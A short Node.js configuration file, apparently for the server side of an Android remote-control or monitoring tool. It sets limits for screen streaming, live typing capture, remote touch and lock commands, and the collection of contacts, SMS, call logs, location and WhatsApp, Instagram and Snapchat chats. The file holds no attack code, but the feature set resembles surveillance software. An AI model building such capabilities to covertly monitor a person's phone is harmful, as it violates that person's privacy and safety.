'use strict';

module.exports = {
    MAX_BODY_SIZE: '120mb',
    MAX_BINARY_SIZE: '120mb',
    SOCKET_PING_TIMEOUT: 60000,
    SOCKET_PING_INTERVAL: 25000,
    SOCKET_MAX_BUFFER: 1e8, // 100MB
    DEVICE_OFFLINE_MS: 60000,
    MAX_FILE_RECORDS: 5000,
    MAX_LIVE_STATUS_RECORDS: 30,
    LIVE_TYPING_STABLE_MS: 4000,
    SCREEN_MAX_FRAME_SIZE: 8 * 1024 * 1024, // 8MB
    CHAT_DEDUP_WINDOW_MS: 5000,
    CHAT_MAX_MESSAGES: 5000,
    ACTIVITY_RETENTION_DAYS: 90,
    BOOT_STATUS_RETENTION_DAYS: 30,
    HISTORY_RETENTION_DAYS: 180,
    SUPPORTED_CHAT_APPS: ['whatsapp', 'instagram', 'snapchat'],
    CONTROL_COMMANDS: [
        'click', 'swipe', 'home', 'back', 'recents', 'lock', 'unlock',
        'swipe_up', 'swipe_down', 'volume_up', 'volume_down',
        'start_screen', 'stop_screen'
    ],
    PERSIST_DATA_TYPES: [
        'contacts', 'sms', 'call_logs', 'notifications', 'live_status',
        'location', 'network', 'apps', 'installed_apps', 'chat_logs',
        'permission_status'
    ]
};
